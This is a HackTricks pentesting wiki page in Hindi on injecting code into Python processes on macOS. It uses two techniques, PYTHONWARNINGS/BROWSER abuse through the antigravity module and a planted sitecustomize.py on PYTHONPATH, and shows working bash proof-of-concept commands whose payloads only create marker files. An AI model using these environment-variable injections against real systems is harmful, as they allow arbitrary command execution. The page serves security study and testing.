# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` और `BROWSER` environment variables के माध्यम से

यदि कोई attacker किसी Python process के environment को नियंत्रित कर सकता है, तो `PYTHONWARNINGS` और `BROWSER` का संयोजन crafted warning option को process करते समय Python द्वारा `antigravity` module import किए जाने पर command execution trigger कर सकता है। यह technique `antigravity` द्वारा Python के `webbrowser` module से URL खोलने पर निर्भर करती है, जो `BROWSER` environment variable का सम्मान करता है।<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## `PYTHONPATH` और `sitecustomize.py` के माध्यम से

सामान्य startup के दौरान Python का `site` module site-specific paths जोड़ता है और फिर `sitecustomize` नामक module को import करने का प्रयास करता है। `PYTHONPATH` में attacker-readable directory को सबसे पहले रखकर, process environment को नियंत्रित करने वाला attacker target script से पहले Python को payload import करने के लिए मजबूर कर सकता है। `-S` flag automatic `site` initialization को disable करता है, जबकि isolated mode (`-I`) `PYTHONPATH` को ignore करता है और `-s` तथा `-E` को imply करता है।<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Environment Variables के साथ Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python command-line और environment](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
